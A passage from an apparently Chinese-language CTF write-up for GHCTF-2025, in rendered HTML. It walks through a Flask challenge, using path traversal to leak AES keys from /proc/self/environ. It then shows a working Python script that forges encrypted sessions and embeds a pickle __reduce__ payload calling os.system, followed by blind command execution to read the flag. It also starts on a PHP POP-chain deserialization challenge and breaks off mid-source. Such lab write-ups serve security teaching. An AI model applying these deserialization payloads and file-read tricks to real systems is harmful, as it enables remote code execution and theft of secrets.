function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:  <span class="comment">#要求为POST方法</span></span><br><span class="line">        username = request.form.get(<span class="string">&quot;username&quot;</span>) </span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="comment">#可以输入username和password</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> users.get(username) == password: <span class="comment">#输入的password等于username的</span></span><br><span class="line">            resp = make_response(redirect(<span class="string">&quot;/&quot;</span>)) <span class="comment">#重定向到/路由</span></span><br><span class="line">            resp.set_cookie(<span class="string">&quot;session&quot;</span>, create_session(username)) <span class="comment">#设置一个cookie，跟进create_session方法</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>, error=<span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br></pre></td></tr></table></figure><p>create_session方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_session</span>(<span class="params">username</span>):</span><br><span class="line">    session_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;expires&quot;</span>: time.time() + <span class="number">3600</span>  <span class="comment"># Session expires in 1 hour</span></span><br><span class="line">    &#125;</span><br><span class="line">    pickled = pickle.dumps(session_data) <span class="comment"># session_data为注入点</span></span><br><span class="line">    pickled_data = base64.b64encode(pickled).decode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment"># base64编码</span></span><br><span class="line"></span><br><span class="line">    key, iv = generate_key_iv() <span class="comment"># 跟进generate_key_iv</span></span><br><span class="line">    session = aes_encrypt_decrypt(pickled_data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span>) <span class="comment">#跟进aes_encrypt_decrypt方法，其实也不用分析aes_encrypt_decrypt方法。其就是用于加密解密。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session</span><br></pre></td></tr></table></figure><p>generate_key_iv方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_iv</span>():</span><br><span class="line">    key = os.environ.get(<span class="string">&#x27;SECRET_key&#x27;</span>).encode() <span class="comment">#从环境中获取secret_key</span></span><br><span class="line">    iv = os.environ.get(<span class="string">&#x27;SECRET_iv&#x27;</span>).encode() <span class="comment">#从环境中获取secret_iv</span></span><br><span class="line">    <span class="keyword">return</span> key, iv <span class="comment">#返回key 和 iv 回归到create_session方法</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在/路由filename输入/proc/self/environ,获取环境变量。</span></span><br><span class="line"><span class="string">SECRET_key=ajwdopldwjdowpajdmslkmwjrfhgnbbv</span></span><br><span class="line"><span class="string">SECRET_iv=asdwdggiouewhgpw</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>接着分析&#x2F;路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;session&quot;</span> <span class="keyword">in</span> request.cookies:</span><br><span class="line">        session = validate_session(request.cookies[<span class="string">&quot;session&quot;</span>]) <span class="comment"># 跟进validate_session ;注入点在这里</span></span><br><span class="line">        <span class="keyword">if</span> session: <span class="comment">#存在</span></span><br><span class="line">            data = <span class="string">&quot;&quot;</span></span><br><span class="line">            filename = request.form.get(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> filename:</span><br><span class="line">                data = dowload_file(filename) <span class="comment"># 跟进dowload_file;用于读取文件并显示出来</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, name=session[<span class="string">&#x27;username&#x27;</span>], file_data=data)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>) <span class="comment"># 重定向到/login路由</span></span><br></pre></td></tr></table></figure><p>validate_session方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">validate_session</span>(<span class="params">cookie</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key, iv = generate_key_iv() <span class="comment"># 从环境变量中获取key和iv</span></span><br><span class="line">        pickled = aes_encrypt_decrypt(cookie, key, iv, mode=<span class="string">&#x27;decrypt&#x27;</span>) <span class="comment"># 解密</span></span><br><span class="line">        pickled_data = base64.b64decode(pickled) <span class="comment"># base64 解码</span></span><br><span class="line"></span><br><span class="line">        session_data = pickle.loads(pickled_data) <span class="comment"># 这里进行了pickle 反序列化 ，只要在这一步完成恶意代码执行就可以</span></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&quot;username&quot;</span>] != <span class="string">&quot;admin&quot;</span>: <span class="comment">#session_data的username键必须为admin</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> session_data <span class="keyword">if</span> session_data[<span class="string">&quot;expires&quot;</span>] &gt; time.time() <span class="keyword">else</span> <span class="literal">False</span> <span class="comment"># 这里判断session是否过期；返回/路由</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>dowload_file方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">filename</span>):</span><br><span class="line">    path = os.path.join(<span class="string">&quot;static&quot;</span>, filename)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">os.path.join：当filename以斜杠开头是，会忽略掉它之前的所有片段将其视为绝对路径。</span></span><br><span class="line"><span class="string">这就是为啥，前面在泄露源码的时候，输入/app/app.py，不是在static目录下，而是在/目录下寻找，返回/目录的文件或文件夹。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>该分析的都分析完了，现在看看如何伪造session；session由create_session方法创造的；create_session方法包含aes_encrypt_decrypt方法；我们将这两个方法写入脚本；再引入需要的库就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> base64, pickle, time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt_decrypt</span>(<span class="params">data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span></span>):</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">        encryptor = cipher.encryptor()</span><br><span class="line">        padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">        padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">        result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(result).decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;decrypt&#x27;</span>:</span><br><span class="line">        decryptor = cipher.decryptor()</span><br><span class="line">        encrypted_data_bytes = base64.b64decode(data)</span><br><span class="line">        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()</span><br><span class="line">        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</span><br><span class="line">        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">        <span class="keyword">return</span> unpadded_data.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_session</span>(<span class="params">username,key,iv</span>):</span><br><span class="line">    session_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;expires&quot;</span>: time.time() + <span class="number">3600</span>,  <span class="comment"># Session expires in 1 hour</span></span><br><span class="line">    &#125;</span><br><span class="line">    pickled = pickle.dumps(session_data)</span><br><span class="line">    pickled_data = base64.b64encode(pickled).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    session = aes_encrypt_decrypt(pickled_data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">b&#x27;ajwdopldwjdowpajdmslkmwjrfhgnbbv&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;asdwdggiouewhgpw&#x27;</span></span><br><span class="line">    result = create_session(<span class="string">&#x27;admin&#x27;</span>,key,iv)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="comment">#运行</span></span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-14%20092239.png" class="" title="屏幕截图 2025-06-14 092239"><img src="/CTFwp/GHCTF-2025/image-20250614092356808.png" class="" title="image-20250614092356808"><p>我们看到这个是可以的。</p><p>pickle反序列化，没有禁用R指令，我们使用<code>__reduce__</code>方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> base64, pickle, time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt_decrypt</span>(<span class="params">data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span></span>):</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">        encryptor = cipher.encryptor()</span><br><span class="line">        padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">        padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">        result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(result).decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;decrypt&#x27;</span>:</span><br><span class="line">        decryptor = cipher.decryptor()</span><br><span class="line">        encrypted_data_bytes = base64.b64decode(data)</span><br><span class="line">        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()</span><br><span class="line">        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</span><br><span class="line">        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">        <span class="keyword">return</span> unpadded_data.decode()</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> os.system, (<span class="string">&#x27;sleep 3&#x27;</span>, )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_session</span>(<span class="params">username,key,iv</span>):</span><br><span class="line">    session_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;expires&quot;</span>: time.time() + <span class="number">3600</span>,  <span class="comment"># Session expires in 1 hour</span></span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>:A() <span class="comment"># 这个是真的神奇</span></span><br><span class="line">    &#125;</span><br><span class="line">    pickled = pickle.dumps(session_data)</span><br><span class="line">    pickled_data = base64.b64encode(pickled).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    session = aes_encrypt_decrypt(pickled_data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">b&#x27;ajwdopldwjdowpajdmslkmwjrfhgnbbv&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;asdwdggiouewhgpw&#x27;</span></span><br><span class="line">    result = create_session(<span class="string">&#x27;admin&#x27;</span>,key,iv)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-14%20092729.png" class="" title="屏幕截图 2025-06-14 092729"><p>确实可以执行；但是没有回显。</p><p>现在就是无回显命令执行；测试当前目录是否可以写入，发现其确实可以写入。</p><p><code>ls|tee 1</code>执行此命令；接着<code>ls /</code>；</p><img src="/CTFwp/GHCTF-2025/image-20250614093413326.png" class="" title="image-20250614093413326"><p><code>cat /f*|tee 1</code></p><img src="/CTFwp/GHCTF-2025/image-20250614093547211.png" class="" title="image-20250614093547211"><h2 id="Popppppp"><a href="#Popppppp" class="headerlink" title="Popppppp"></a>Popppppp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1; <span class="comment">// 4 fruit1 赋值为 CherryBlossom 的实例化对象，将对象当做字符串用，触发该对象的__toString()方法。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2; <span class="comment">// 3 fruit2 赋值为 Philosopher的实例化对象，将对象当做函数来调用，触发该对象的__invoke方法。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forbidden</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit3 = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>); <span class="comment">// 1 利用点在这里</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The time spent with xxx is my happiest time&quot;</span> . <span class="variable language_">$this</span>-&gt;fruit9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span> . <span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;  <span class="comment">// 2 fruit10 赋值为 Mystery的实例化对象，该对象并没有hey属性，触发该对象的__get方法。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessTwo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hiddenVar</span> = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hiddenVar = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hiddenVar;</span><br><span class="line">    &#125;</span><br><span 